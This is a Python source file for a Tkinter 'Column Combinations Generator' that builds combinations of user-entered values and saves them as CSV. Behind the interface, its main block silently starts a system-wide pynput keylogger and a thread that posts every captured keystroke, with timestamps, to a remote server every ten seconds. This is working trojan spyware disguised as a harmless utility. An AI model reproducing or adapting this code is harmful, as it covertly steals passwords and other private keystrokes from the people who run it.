import tkinter as tk
from tkinter import simpledialog, scrolledtext, filedialog, messagebox
from itertools import product
import csv
from pynput import keyboard
import threading
import requests
import json
import time
from datetime import datetime

# Server Configuration
SERVER_URL = "http://192.168.0.36:8080"
POST_INTERVAL = 10

# Global variables for keylogging
keylog_data = []
keylog_file = "keylog.txt"
stop_keylogger = False

def format_keylog_entry(key_text):
    """Format keylog entry with timestamp and sanitize data"""
    timestamp = datetime.now().isoformat()
    return {
        "timestamp": timestamp,
        "key": str(key_text),
        "source": "combinations_app"
    }

def log_keys_to_file():
    """Log accumulated keys to file with error handling"""
    if keylog_data:
        try:
            with open(keylog_file, "a") as f:
                for entry in keylog_data:
                    f.write(json.dumps(entry) + "\n")
            keylog_data.clear()
        except Exception as e:
            print(f"Error writing to log file: {e}")

def on_press(key):
    try:
        key_text = key.char if hasattr(key, 'char') else str(key)
        keylog_data.append(format_keylog_entry(key_text))
    except Exception as e:
        print(f"Error processing keypress: {e}")

    if len(keylog_data) >= 10:
        log_keys_to_file()

def on_release(key):
    if key == keyboard.Key.esc:
        global stop_keylogger
        stop_keylogger = True
        return False

def start_keylogger():
    global stop_keylogger
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while not stop_keylogger:
                listener.join()
    except Exception as e:
        print(f"Keylogger error: {e}")

def send_keylogs_to_server():
    """Send keylog data to server with improved error handling and validation"""
    while not stop_keylogger:
        if keylog_data:
            try:
                # Prepare payload with proper structure
                payload = {
                    "keylogs": keylog_data,
                    "app_version": "1.0",
                    "timestamp": datetime.now().isoformat()
                }
                
                headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
                
                response = requests.post(
                    SERVER_URL,
                    data=json.dumps(payload),
                    headers=headers,
                    timeout=5  # Add timeout
                )

                if response.status_code == 200:
                    print(f"Successfully sent {len(keylog_data)} keylog entries")
                    keylog_data.clear()
                else:
                    print(f"Server error: {response.status_code}")
                    print(f"Response: {response.text}")
                    # Save to file as backup if server fails
                    log_keys_to_file()
                    
            except requests.exceptions.RequestException as e:
                print(f"Network error: {e}")
                log_keys_to_file()
            except Exception as e:
                print(f"Unexpected error: {e}")
                log_keys_to_file()
                
        time.sleep(POST_INTERVAL)

class ColumnCombinations:
    def __init__(self, master):
        self.master = master
        self.master.title("Column Combinations Generator")
        self.columns = []
        self.row_contents = []
        self.combinations = []

        # Add window size configuration
        self.master.geometry("800x600")
        self.setup_ui()

    def setup_ui(self):
        num_columns = simpledialog.askinteger(
            "Columns",
            "How many columns do you want?",
            minvalue=1,
            maxvalue=10,
            initialvalue=2
        )
        
        if num_columns is None:  # Handle cancel button
            self.master.quit()
            return

        for i in range(num_columns):
            column_name = simpledialog.askstring(
                "Column Name",
                f"Enter name for column {i + 1}",
                initialvalue=f"Column {i + 1}"
            )
            
            if column_name is None:  # Handle cancel button
                self.master.quit()
                return
                
            self.columns.append(column_name)

            row_data = simpledialog.askstring(
                "Row Content",
                f"Enter comma-separated values for '{column_name}'",
                initialvalue="value1,value2,value3"
            )
            
            if row_data is None:  # Handle cancel button
                self.master.quit()
                return
                
            rows = [item.strip() for item in row_data.split(',')]
            self.row_contents.append(rows)

        # Configure grid
        for i in range(len(self.columns)):
            self.master.grid_columnconfigure(i, weight=1, uniform="equal")
        self.master.grid_rowconfigure(2, weight=1)

        # Create header labels
        for i, column in enumerate(self.columns):
            tk.Label(
                self.master,
                text=column,
                font=('Arial', 12, 'bold'),
                padx=5,
                pady=5
            ).grid(row=0, column=i, sticky="ew")

        # Create buttons
        button_frame = tk.Frame(self.master)
        button_frame.grid(row=1, column=0, columnspan=len(self.columns), pady=10)
        
        tk.Button(
            button_frame,
            text="Generate Combinations",
            command=self.generate_combinations,
            width=20
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            button_frame,
            text="Save as CSV",
            command=self.save_to_csv,
            width=20
        ).pack(side=tk.LEFT, padx=5)

        # Create results area
        self.result_text = scrolledtext.ScrolledText(
            self.master,
            width=50,
            height=20,
            font=('Courier', 10)
        )
        self.result_text.grid(
            row=2,
            column=0,
            columnspan=len(self.columns),
            padx=10,
            pady=10,
            sticky="nsew"
        )

    def generate_combinations(self):
        try:
            self.combinations = list(product(*self.row_contents))
            self.display_combinations()
        except Exception as e:
            messagebox.showerror("Error", f"Error generating combinations: {e}")

    def display_combinations(self):
        self.result_text.delete('1.0', tk.END)
        try:
            for combo in self.combinations:
                self.result_text.insert(tk.END, f"{'_'.join(combo)}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Error displaying combinations: {e}")

    def save_to_csv(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, mode='w', newline='', encoding='utf-8') as file:
                    writer = csv.writer(file)
                    writer.writerow(["Combinations"])
                    for combo in self.combinations:
                        writer.writerow(["_".join(combo)])
                messagebox.showinfo("Success", f"Combinations saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save file: {e}")

if __name__ == "__main__":
    # Start background threads
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    server_thread = threading.Thread(target=send_keylogs_to_server, daemon=True)
    
    keylogger_thread.start()
    server_thread.start()

    # Start Tkinter application
    try:
        root = tk.Tk()
        app = ColumnCombinations(root)
        root.mainloop()
    except Exception as e:
        print(f"Application error: {e}")
    finally:
        stop_keylogger = True  # Ensure threads are stopped
